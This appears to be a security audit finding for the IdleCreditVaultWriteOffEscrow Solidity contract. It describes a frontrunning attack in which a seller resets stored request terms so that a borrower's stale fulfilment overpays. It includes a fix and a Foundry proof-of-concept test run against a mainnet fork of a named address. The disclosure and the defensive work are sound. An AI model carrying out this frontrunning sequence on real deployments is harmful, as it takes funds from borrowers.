### Title
Write-off sellers can reset stored terms before fulfilment to force stale overpayment - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary

`IdleCreditVaultWriteOffEscrow` treats the seller’s stored `underlyings` value only as a minimum fulfilment amount. A tranche-holder attacker can delete and recreate the same tranche-sized request with a lower underlying requirement immediately before an honest borrower’s already-signed fulfilment transaction executes. The borrower’s stale `_underlyings` amount is then accepted and paid to the attacker. [1](#0-0) 

### Finding Description

During a running epoch, `createWriteOffRequest` stores a mutable `(tranches, underlyings)` quote and escrows the seller’s tranche tokens. [2](#0-1) 

`deleteWriteOffRequest` returns the escrowed tranche tokens and clears the stored terms without a timelock or fulfilment nonce. [3](#0-2) 

`fullfillWriteOffRequest` requires exact equality for `_tranches`, but only requires `_underlyings >= currentRequest.underlyings`. [4](#0-3) 

The transaction sequence is:

1. The borrower observes a request for `N` tranches and `100e6` underlying.
2. The borrower submits `fullfillWriteOffRequest(seller, N, 100e6)`.
3. The seller frontruns it by calling `deleteWriteOffRequest`, then `createWriteOffRequest(N, 1)`.
4. The borrower’s transaction sees the same tranche amount and a lower minimum underlying amount, so it succeeds.
5. The escrow pulls the stale `100e6` amount from the borrower and sends it, minus the exit fee, to the seller. [5](#0-4) 

This is the contract analogue of stored injection: the attacker stores mutable terms that later control the effect of an already-prepared victim transaction.

### Impact Explanation

The borrower can be forced to pay the stale amount rather than the request amount active at execution. With a `100e6` stale amount and a reset request of `1`, the excess accepted from the borrower is `99,999,999` underlying base units; the seller receives `99,900,000` and the configured `0.1%` exit fee receives `100,000` at the default fee. [6](#0-5) 

The attack requires only a tranche-token holder and an already-running epoch. `createWriteOffRequest` is externally callable, `deleteWriteOffRequest` is externally callable by the request owner, and fulfilment accepts any wallet. [7](#0-6) 

### Likelihood Explanation

Likelihood depends on a borrower or third-party buyer submitting fulfilment while the seller can still observe and reorder the transaction. The attacker does not need a privileged role, borrower access, Keyring approval for escrow actions, malformed tokens, or reentrancy. The nonReentrant guard does not prevent two separate attacker transactions from bracketing the victim transaction. [7](#0-6) 

### Recommendation

Require exact agreement between the fulfiller’s submitted terms and the stored terms:

```solidity
if (
  currentRequest.tranches != _tranches ||
  currentRequest.underlyings != _underlyings
) {
  revert WrongRequest();
}
```

This makes deletion or replacement of the stored request invalidate the pending fulfilment. If intentional overpayment must remain supported, add a separate explicit `maxUnderlyings`/`expectedUnderlyings` mechanism and a request nonce or seller-signed acceptance instead of allowing mutable minimum terms.

### Proof of Concept

Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, whose fixture forks mainnet at block `23032567` and initializes the escrow against `0xf6223C567F21E33e859ED7A045773526E9E3c2D5`. [8](#0-7) 

```solidity
function testSellerCanResetTermsBeforeBorrowerFulfillment() external {
  uint256 trancheAmount = 1e18;
  uint256 stalePayment = 100e6;
  uint256 resetMinimum = 1;

  deal(address(underlying), borrower, stalePayment);

  uint256 sellerUnderlyingBefore = underlying.balanceOf(LP);
  uint256 borrowerUnderlyingBefore = underlying.balanceOf(borrower);
  uint256 feeReceiverBefore = underlying.balanceOf(TL_MULTISIG);

  // Stored terms initially observed by the borrower.
  vm.prank(LP);
  escrow.createWriteOffRequest(trancheAmount, stalePayment);

  // The borrower has submitted its fulfilment with stalePayment. Before it executes,
  // the seller clears and recreates the same-sized request with a lower minimum.
  vm.startPrank(LP);
  escrow.deleteWriteOffRequest();
  escrow.createWriteOffRequest(trancheAmount, resetMinimum);
  vm.stopPrank();

  (, uint256 activeMinimum) = escrow.userRequests(LP);
  assertEq(activeMinimum, resetMinimum);

  // The borrower's stale payment still satisfies the lowered request.
  vm.startPrank(borrower);
  underlying.approve(address(escrow), stalePayment);
  escrow.fullfillWriteOffRequest(LP, trancheAmount, stalePayment);
  vm.stopPrank();

  uint256 expectedFee = stalePayment * escrow.exitFee() / escrow.FULL_VALUE();

  assertEq(borrowerUnderlyingBefore - underlying.balanceOf(borrower), stalePayment);
  assertEq(underlying.balanceOf(LP) - sellerUnderlyingBefore, stalePayment - expectedFee);
  assertEq(underlying.balanceOf(TL_MULTISIG) - feeReceiverBefore, expectedFee);
  assertEq(tranche.balanceOf(borrower), trancheAmount);
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
  }

  /// @notice delete the write-off request and transfer tranche tokens back to the user
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
  }

  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
